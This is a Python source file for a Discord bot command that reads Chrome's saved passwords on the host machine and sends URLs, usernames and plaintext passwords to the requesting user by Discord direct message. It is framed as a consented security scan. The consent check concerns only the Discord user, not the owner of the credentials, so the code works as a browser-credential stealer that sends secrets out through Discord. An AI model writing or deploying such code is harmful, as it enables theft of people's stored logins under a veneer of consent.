import discord
from discord.ext import commands
from core.consent_manager import ConsentManager
from core.password_scanner import PasswordScanner

class PasswordScanCommand(commands.Cog):
    """Password scanning command"""
    
    def __init__(self, bot):
        self.bot = bot
        self.consent_mgr = ConsentManager()
        self.scanner = PasswordScanner()
    
    @commands.command(name='scan_passwords')
    async def scan_passwords(self, ctx):
        """Scan for saved passwords"""
        user_id = ctx.author.id
        
        if not self.consent_mgr.has_consent(user_id, 'passwords') and not self.consent_mgr.has_consent(user_id, 'all'):
            await ctx.author.send("❌ You need to grant consent first! Use `!consent_passwords`")
            return
        
        await ctx.author.send("🔓 Scanning for saved passwords...")
        
        try:
            passwords = self.scanner.scan_chrome_passwords()
            
            report = f"""
🔐 **PASSWORD SCAN RESULTS**

Chrome Passwords Found: {len(passwords)}

**Saved Credentials:**
```
{self._format_passwords(passwords)}
```

⚠️ Your passwords are at risk if browsers are compromised!
            """
            
            await ctx.author.send(report)
            self.consent_mgr.log_consent(user_id, 'passwords', True, f"Scan complete - {len(passwords)} passwords found")
        except Exception as e:
            await ctx.author.send(f"❌ Error during scan: {str(e)}")
    
    def _format_passwords(self, passwords):
        """Format passwords for display"""
        if not passwords:
            return "None found"
        
        result = []
        for pwd in passwords[:10]:  # Show first 10
            result.append(f"URL: {pwd.get('url', 'Unknown')}")
            result.append(f"User: {pwd.get('username', 'Unknown')}")
            result.append(f"Pass: {pwd.get('password', '[ENCRYPTED]')}")
            result.append("---")
        
        return "\n".join(result)

async def setup(bot):
    await bot.add_cog(PasswordScanCommand(bot))
